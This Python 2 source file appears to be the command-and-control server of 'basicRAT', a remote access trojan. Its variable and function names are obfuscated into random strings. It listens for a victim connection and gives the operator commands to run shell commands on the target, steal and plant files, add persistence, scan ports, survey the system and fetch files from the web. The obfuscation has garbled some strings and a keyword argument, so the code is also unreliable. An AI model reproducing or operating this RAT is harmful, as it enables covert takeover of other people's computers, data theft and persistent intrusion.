#!/usr/bin/env python



# -*- coding: utf-8 -*-

































import argparse



import readline



import socket



import struct



import sys



import time







try:



    from core.crypto import rzqOergcOwAqdICMWbxRcgDNsPNjYbRy,PgmvekkMcLykgyZVmWtsRrBgjGzWrFFg,RFUTvnEmRUxqlRjzGrVdjbHBvVOgkYAO



    from core.filesock import zyRDURipqNGanqOrKlMjDpZeOKOMCXCv, dAejAiYnebfrVxzpVgcryDbVphqVKBRb



except ImportError as TdLsaVyGKlEwRTQPjlzufuYQZFTzmivb:



    print TdLsaVyGKlEwRTQPjlzufuYQZFTzmivb



    sys.exit(0)



















nqXfBGPceaADrkKMJQrRoHpIDXCSRynn = '''



download <files>    - Download file(s).



help                - Show this help menu.



persistence         - Apply persistence mechanism.



quit                - Gracefully kill client and server.



rekey               - Regenerate crypto key.



run <command>       - Execute a command on the target.



scan <ip>           - Scan top 25 ports on a single host.



survey              - Run a system survey.



unzip <file>        - Unzip a file.



upload <files>      - Upload files(s).



wget <url>          - Download a file from the web.



'''







kIGgvpRJygUKNAMyjkDcnJPgjUGgwViC = '''



______           _     ______  ___ _____   _            _   



| ___ \         (_)    | ___ \/ _ \_   _| | |          | |  



| |_/ / __ _ ___ _  ___| |_/ / /_\ \| |   | |_ ___  ___| |_ 



| ___ \/ _` / __| |/ __|    /|  _  || |   | __/ _ \/ __| __|



| |_/ / (_| \__ \ | (__| |\ \| | | || |   | ||  __/\__ \ |_ 



\____/ \__,_|___/_|\___\_| \_\_| |_/\_/    \__\___||___/\__|



                                                            







'''











VEFbiBkOgYcNWYYtwaZWVvpzikkqGuEg = [ 'download', 'help', 'persistence', 'quit', 'rekey', 'run',



             'scan', 'survey', 'unzip', 'upload', 'wget' ]















def fXcATsNKjBwaYRjPWrLVVDFcAYAxoPMR():



    ReLEznRAezTOemlzzwdjbMjYJWjZzgQT = argparse.ArgumentParser(description='basicRAT server')



    ReLEznRAezTOemlzzwdjbMjYJWjZzgQT.add_argument('-p', '--port', help='Port to listen on.',



                        default=1337, type=int)



    return ReLEznRAezTOemlzzwdjbMjYJWjZzgQT















def SlmlAKMIPbPQDhrIrwoBKCoWVDmBNljk():



    ReLEznRAezTOemlzzwdjbMjYJWjZzgQT  = fXcATsNKjBwaYRjPWrLVVDFcAYAxoPMR()



    ARuIaYNpRAeBkNevhtzCmSyTYRLTfXIC    = vars(ReLEznRAezTOemlzzwdjbMjYJWjZzgQT.parse_args())



    ZcLPqvNByyJfKKeYYPfEIWSJCmvGCdJI    = ARuIaYNpRAeBkNevhtzCmSyTYRLTfXIC['port']







    zwmnHUrTibFtdUdmJUyGAaflHyJBVFtK = socket.socket(socket.AF_INET, socket.SOCK_STREAM)







    try:



        zwmnHUrTibFtdUdmJUyGAaflHyJBVFtK.bind(('0.0.0.0', ZcLPqvNByyJfKKeYYPfEIWSJCmvGCdJI))



    except socket.error:



        print 'Error: Unable to start ZYGuMPTvOHyplLngQUvBKaRIfhZSEjzw, ZcLPqvNByyJfKKeYYPfEIWSJCmvGCdJI {} in use?'.format(ZcLPqvNByyJfKKeYYPfEIWSJCmvGCdJI)



        sys.exit(1)







    for sylWpKvpDMleykvOdVzvIFXEkHymVRVo in kIGgvpRJygUKNAMyjkDcnJPgjUGgwViC.split('\n'):



        time.sleep(0.05)



        print sylWpKvpDMleykvOdVzvIFXEkHymVRVo







    print 'basicRAT ZYGuMPTvOHyplLngQUvBKaRIfhZSEjzw listening on ZcLPqvNByyJfKKeYYPfEIWSJCmvGCdJI {}...'.format(ZcLPqvNByyJfKKeYYPfEIWSJCmvGCdJI)







    zwmnHUrTibFtdUdmJUyGAaflHyJBVFtK.listen(10)



    OiQYpyfpmeBukBkUmpQYzCDXgcDHJREM, XRbZiXVxvsAxJNKLBeWWbxDrJPgDwsEV = zwmnHUrTibFtdUdmJUyGAaflHyJBVFtK.accept()







    ioXNZzSuBcfqlHeudtDIBlckbebEgEJT = RFUTvnEmRUxqlRjzGrVdjbHBvVOgkYAO(OiQYpyfpmeBukBkUmpQYzCDXgcDHJREM, ZYGuMPTvOHyplLngQUvBKaRIfhZSEjzw=True)







    while True:



        hFbjUPJftXXzpJjEPkYenwIgsuegotSH = raw_input('\n[{}] basicRAT> '.format(XRbZiXVxvsAxJNKLBeWWbxDrJPgDwsEV[0])).rstrip()







        



        if not hFbjUPJftXXzpJjEPkYenwIgsuegotSH:



            continue







        



        kDvmSbDWGREGzvDvJFahztwvIgzTOBjb, _, oAQVzlMVsxRYLhyULuJdubVINkXxrRGC = hFbjUPJftXXzpJjEPkYenwIgsuegotSH.partition(' ')







        



        if kDvmSbDWGREGzvDvJFahztwvIgzTOBjb not in VEFbiBkOgYcNWYYtwaZWVvpzikkqGuEg:



            print 'Invalid command, type "help" to see peDDxedggqcIAYRSEHpgOCoWEIknJTsg list of commands.'



            continue







        



        if kDvmSbDWGREGzvDvJFahztwvIgzTOBjb == 'help':



            print nqXfBGPceaADrkKMJQrRoHpIDXCSRynn



            continue







        



        OiQYpyfpmeBukBkUmpQYzCDXgcDHJREM.send(PgmvekkMcLykgyZVmWtsRrBgjGzWrFFg(hFbjUPJftXXzpJjEPkYenwIgsuegotSH, ioXNZzSuBcfqlHeudtDIBlckbebEgEJT))







        



        if kDvmSbDWGREGzvDvJFahztwvIgzTOBjb == 'quit':



            zwmnHUrTibFtdUdmJUyGAaflHyJBVFtK.close()



            sys.exit(0)







        



        elif kDvmSbDWGREGzvDvJFahztwvIgzTOBjb == 'run':



            mHtOgITyCYigDtoBLdKVCeUonzovdLMl = OiQYpyfpmeBukBkUmpQYzCDXgcDHJREM.recv(4096)



            print rzqOergcOwAqdICMWbxRcgDNsPNjYbRy(mHtOgITyCYigDtoBLdKVCeUonzovdLMl, ioXNZzSuBcfqlHeudtDIBlckbebEgEJT).rstrip()







        



        elif kDvmSbDWGREGzvDvJFahztwvIgzTOBjb == 'download':



            for IhVAcbSPQnyzmlrBGiufqberOtGSXlZQ in oAQVzlMVsxRYLhyULuJdubVINkXxrRGC.split():



                IhVAcbSPQnyzmlrBGiufqberOtGSXlZQ = IhVAcbSPQnyzmlrBGiufqberOtGSXlZQ.strip()



                zyRDURipqNGanqOrKlMjDpZeOKOMCXCv(OiQYpyfpmeBukBkUmpQYzCDXgcDHJREM, IhVAcbSPQnyzmlrBGiufqberOtGSXlZQ, ioXNZzSuBcfqlHeudtDIBlckbebEgEJT)







        



        elif kDvmSbDWGREGzvDvJFahztwvIgzTOBjb == 'upload':



            for IhVAcbSPQnyzmlrBGiufqberOtGSXlZQ in oAQVzlMVsxRYLhyULuJdubVINkXxrRGC.split():



                IhVAcbSPQnyzmlrBGiufqberOtGSXlZQ = IhVAcbSPQnyzmlrBGiufqberOtGSXlZQ.strip()



                dAejAiYnebfrVxzpVgcryDbVphqVKBRb(OiQYpyfpmeBukBkUmpQYzCDXgcDHJREM, IhVAcbSPQnyzmlrBGiufqberOtGSXlZQ, ioXNZzSuBcfqlHeudtDIBlckbebEgEJT)







        



        elif kDvmSbDWGREGzvDvJFahztwvIgzTOBjb == 'rekey':



            ioXNZzSuBcfqlHeudtDIBlckbebEgEJT = RFUTvnEmRUxqlRjzGrVdjbHBvVOgkYAO(OiQYpyfpmeBukBkUmpQYzCDXgcDHJREM, ZYGuMPTvOHyplLngQUvBKaRIfhZSEjzw=True)







        



        elif kDvmSbDWGREGzvDvJFahztwvIgzTOBjb in ['scan', 'survey', 'persistence', 'unzip', 'wget']:



            print 'Running {}...'.format(kDvmSbDWGREGzvDvJFahztwvIgzTOBjb)



            mHtOgITyCYigDtoBLdKVCeUonzovdLMl = OiQYpyfpmeBukBkUmpQYzCDXgcDHJREM.recv(1024)



            print rzqOergcOwAqdICMWbxRcgDNsPNjYbRy(mHtOgITyCYigDtoBLdKVCeUonzovdLMl, ioXNZzSuBcfqlHeudtDIBlckbebEgEJT)























if __name__ == '__main__':



    SlmlAKMIPbPQDhrIrwoBKCoWVDmBNljk()



